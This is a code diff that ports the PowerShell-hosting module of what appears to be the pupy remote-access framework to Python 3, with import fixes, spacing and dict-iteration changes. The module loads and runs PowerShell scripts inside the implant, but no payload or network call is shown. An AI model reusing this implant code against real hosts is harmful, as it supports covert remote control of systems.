@@ -4,7 +4,10 @@ from __future__ import print_function
 from __future__ import absolute_import
 from __future__ import division
 from __future__ import unicode_literals
+
 import pupy
+
+import sys
 import base64
 import subprocess
 import os
@@ -12,26 +15,37 @@ import zlib
 import threading
 import re
 import random
-import Queue
 import string
+
+if sys.version_info.major > 2:
+    from queue import Queue, Empty
+else:
+    from Queue import Queue, Empty
+
 
 class PowerHostUninitialized(Exception):
     pass
 
+
 class PowershellUninitialized(Exception):
     pass
+
 
 class PowershellInitializationFailed(Exception):
     pass
 
+
 class PowershellContextUnregistered(Exception):
     pass
+
 
 class PowershellV2NotInstalled(Exception):
     pass
 
+
 class PowershellTimeout(Exception):
     pass
+
 
 class Request(object):
     def __init__(self, rid, storage, expression, timeout=None, continious=False):
@@ -363,6 +377,7 @@ class Powershell(threading.Thread):
         except:
             pass
 
+
 class PowerHost(object):
     def __init__(self, manager):
         self._powershells = {}
@@ -451,6 +466,7 @@ class PowerHost(object):
     def stopped(self):
         return not self._powershells
 
+
 def loaded(name=None):
     powershell = pupy.manager.get(PowerHost)
     if not powershell:
@@ -460,6 +476,7 @@ def loaded(name=None):
             return False
 
     return powershell.registered(name)
+
 
 def load(name, content, force=False, try_x64=False, daemon=False, width=None, v2=None):
     powershell = pupy.manager.get(PowerHost) or \
@@ -473,12 +490,14 @@ def load(name, content, force=False, try_x64=False, daemon=False, width=None, v2
     else:
         powershell.register(name, content, force, try_x64, daemon, width, v2)
 
+
 def unload(name):
     powershell = pupy.manager.get(PowerHost)
     if not powershell:
         raise PowerHostUninitialized()
 
     powershell.unregister(name)
+
 
 def call(name, expression, async=False, timeout=None, content=None, try_x64=False):
     powershell = pupy.manager.get(PowerHost) or \
@@ -501,6 +520,7 @@ def call(name, expression, async=False, timeout=None, content=None, try_x64=Fals
         if content:
             unload(name)
 
+
 def result(name, rid):
     rid = int(rid)
 
@@ -520,18 +540,21 @@ def result(name, rid):
 
     return result
 
+
 def get_results():
     powershell = pupy.manager.get(PowerHost)
     if not powershell:
         raise PowerHostUninitialized()
 
     return {
-        ctx:results.keys() for ctx, results in powershell.results.iteritems()
+        ctx:results.keys() for ctx, results in powershell.results.items()
     }
+
 
 @property
 def results():
     return get_results()
+
 
 def stop():
     pupy.manager.stop(PowerHost)
